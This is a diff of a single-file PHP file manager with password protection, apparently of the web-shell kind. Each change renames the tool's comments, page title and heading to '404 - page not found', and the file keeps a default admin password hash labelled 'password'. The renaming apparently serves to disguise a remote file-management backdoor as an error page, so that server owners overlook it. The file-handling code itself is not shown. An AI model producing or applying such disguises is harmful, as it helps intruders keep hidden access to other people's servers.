@@ -1,7 +1,7 @@
 <?php
 /*
-  Pernah waras — Safe File Manager (single-file) + 404 Password Protection
-  (Sistem autentikasi diambil dari Leuser Manager yang sudah works)
+  404 - page not found (single-file) + 404 Password Protection
+  (Sistem autentikasi diambil dari 404 - page not found yang sudah works)
 */
 
 /* ----------------- POLYFILLS / BACKWARDS COMPAT ----------------- */
@@ -59,7 +59,7 @@ function safe_base64_decode($data) {
 }
 
 /* ============================================================
-   ================ SISTEM AUTENTIKASI (dari Leuser Manager) ===
+   ================ SISTEM AUTENTIKASI (dari 404 - page not found) ===
    ============================================================ */
 $ADMIN_HASH = '$2y$10$W3CtskR6jj2FmLsW7kc24uud2en9sqiN4xinFasRPtNxy.E940/Jm'; // default: "password"
 
@@ -438,7 +438,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <html>
 <head>
 <meta charset="utf-8">
-<title>Pernah Waras — Safe File Manager</title>
+<title>404 - page not found</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
 /* --- GAYA UTAMA YANG LEBIH MODERN DAN NYAMAN --- */
@@ -790,7 +790,7 @@ body.dark-mode button.button:hover {
 </head>
 <body>
 <h1>
-    <span class="title-text">📁 Pernah Waras — Safe File Manager</span>
+    <span class="title-text">📁 404 - page not found</span>
     <button id="darkModeToggle" aria-label="Toggle dark mode">🌙</button>
     <a href="?logout" class="logout-link">Logout</a>
 </h1>
